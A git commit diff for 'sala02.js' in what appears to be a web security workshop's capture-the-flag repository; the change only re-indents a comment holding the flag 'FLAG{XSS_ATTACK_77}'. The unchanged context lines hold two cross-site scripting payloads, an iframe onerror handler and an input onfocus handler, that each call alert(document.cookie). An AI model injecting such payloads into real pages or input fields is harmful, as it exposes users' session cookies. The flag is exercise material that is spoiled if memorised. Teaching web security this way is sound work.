40ad5469974a53823368349e98e44f904febb7b3
Izabel Chaves <145824500+rainbowcrack@users.noreply.github.com>
2025-03-29 16:04:58 -0300

    Update sala02.js

--- Workshop-Vai-na-WEB-Summit-2025/sala02.js
+++ Workshop-Vai-na-WEB-Summit-2025/sala02.js
@@ -3,4 +3,4 @@
 <iframe src="x" onerror="alert(document.cookie)"></iframe>
 <input onfocus="alert(document.cookie)" value="Clique aqui">
   
-  // FLAG: FLAG{XSS_ATTACK_77}
+// FLAG: FLAG{XSS_ATTACK_77}
